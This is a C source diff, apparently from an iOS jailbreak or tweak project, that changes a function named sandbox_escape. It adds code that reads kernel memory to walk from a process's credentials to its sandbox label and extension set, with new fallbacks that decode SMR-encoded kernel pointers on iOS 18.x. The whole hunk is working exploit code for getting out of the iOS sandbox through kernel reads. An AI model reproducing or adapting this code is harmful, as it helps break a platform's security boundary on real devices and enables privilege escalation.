@@ -332,13 +332,30 @@ int sandbox_escape(uint64_t self_proc) {
     if (!K(ucred)) { TweakLog("[SBX] ucred not found in proc_ro"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!ptr_in_kernel_mapped(label, ucred)) { TweakLog("[SBX] cr_label invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    if (!ptr_in_kernel_mapped(label, ucred)) {
+        // 18.x: cr_label may be SMR-encoded (observed SMR values in proc_ro
+        // scan on 18.4.1) — S() only PAC-strips, so retry with the SMR decode.
+        uint64_t labelSmr = kread_smrptr(ucred + OFF_UCRED_CR_LABEL);
+        TweakLog("[SBX] cr_label: S()=0x%llx SMR=0x%llx (ucred=0x%llx)", label, labelSmr, ucred);
+        if (ptr_in_kernel_mapped(labelSmr, ucred)) { label = labelSmr; }
+        else { TweakLog("[SBX] cr_label invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    }
 
     uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!ptr_in_kernel_mapped(sandbox, label)) { TweakLog("[SBX] sandbox invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    if (!ptr_in_kernel_mapped(sandbox, label)) {
+        uint64_t sandboxSmr = kread_smrptr(label + OFF_LABEL_SANDBOX);
+        TweakLog("[SBX] sandbox: S()=0x%llx SMR=0x%llx (label=0x%llx)", sandbox, sandboxSmr, label);
+        if (ptr_in_kernel_mapped(sandboxSmr, label)) { sandbox = sandboxSmr; }
+        else { TweakLog("[SBX] sandbox invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    }
 
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!ptr_in_kernel_mapped(ext_set, sandbox)) { TweakLog("[SBX] ext_set invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    if (!ptr_in_kernel_mapped(ext_set, sandbox)) {
+        uint64_t extSetSmr = kread_smrptr(sandbox + OFF_SANDBOX_EXT_SET);
+        TweakLog("[SBX] ext_set: S()=0x%llx SMR=0x%llx (sandbox=0x%llx)", ext_set, extSetSmr, sandbox);
+        if (ptr_in_kernel_mapped(extSetSmr, sandbox)) { ext_set = extSetSmr; }
+        else { TweakLog("[SBX] ext_set invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    }
 
     TweakLog("[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
           proc_ro, ucred, label, sandbox, ext_set);
